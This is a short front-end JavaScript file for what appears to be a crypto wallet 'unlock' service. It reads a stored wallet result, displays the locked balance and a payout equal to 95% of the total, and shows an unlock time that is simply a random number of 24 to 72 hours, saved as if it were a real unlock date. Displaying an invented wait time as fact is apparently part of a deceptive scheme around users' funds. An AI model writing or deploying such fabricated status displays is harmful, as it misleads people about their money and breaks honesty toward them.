// frontend/js/feedback.js
document.addEventListener('DOMContentLoaded', function() {
  const resultData = sessionStorage.getItem('walletResult');
  
  if (!resultData) {
    window.location.href = 'index.html';
    return;
  }

  try {
    const result = JSON.parse(resultData);
    console.log('📊 Feedback data:', result);

    const lockedBalanceElement = document.getElementById('lockedBalance');
    const receiveBalanceElement = document.getElementById('receiveBalance');
    const unlockTimeElement = document.getElementById('unlockTime');

    const lockedBalance = result.lockedBalance || 0;
    const totalBalance = (result.unlockedBalance || 0) + (result.lockedBalance || 0);
    
    if (lockedBalanceElement) {
      lockedBalanceElement.textContent = lockedBalance.toFixed(6);
    }

    const receiveBalance = totalBalance * 0.95;
    if (receiveBalanceElement) {
      receiveBalanceElement.textContent = receiveBalance.toFixed(6);
    }

    if (unlockTimeElement) {
      const randomHours = Math.floor(Math.random() * 48) + 24; // 24-72 hours
      unlockTimeElement.textContent = randomHours + ' hours';
      
      const unlockDate = new Date(Date.now() + randomHours * 60 * 60 * 1000);
      sessionStorage.setItem('unlockDate', unlockDate.toISOString());
      sessionStorage.setItem('unlockHours', randomHours);
    }

  } catch (error) {
    console.error('❌ Error:', error);
    window.location.href = 'index.html';
  }
});